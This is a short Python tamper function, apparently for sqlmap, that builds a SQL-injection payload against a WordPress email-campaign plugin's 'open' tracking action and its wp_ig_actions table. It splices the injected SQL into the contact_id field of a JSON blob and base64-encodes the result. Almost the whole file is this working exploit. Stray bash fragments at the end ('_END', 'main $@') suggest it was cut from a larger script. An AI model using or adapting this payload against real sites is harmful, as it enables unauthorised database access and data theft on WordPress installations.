#!/usr/bin/env python

import base64
import urllib

def tamper(payload, **kwargs):

#{"message_id":"100","campaign_id":"100","contact_id":"100","email":"kbaz@sogetiesec.com","guid":"kbazis-dabest-kbazis-dabest-baprou","action":"open"}
#INSERT INTO wp_ig_actions (created_at, updated_at, count, contact_id, message_id, campaign_id, type) VALUES ('1595001866','1595001866','1','100','100','100','3') ON DUPLICATE KEY UPDATE created_at = created_at, count = count+1, updated_at = '1595001866'

	param  = '{"contact_id":"'
	param += "100','100','100','3'),('1594999398','1594999398','1',(1%s),'100','100','3'),('1594999398','1594999398','1','100"
	param += '","campaign_id":"100","message_id":"100","email":"kbaz@sogetiesec.com","guid":"kbazis-dabest-kbazis-dabest-baprou","action":"open"}'

	#print(param%payload)
	return base64.encodestring( (param%payload).encode('utf-8') ).decode('utf-8').replace('\n', '')
_END
}

main $@
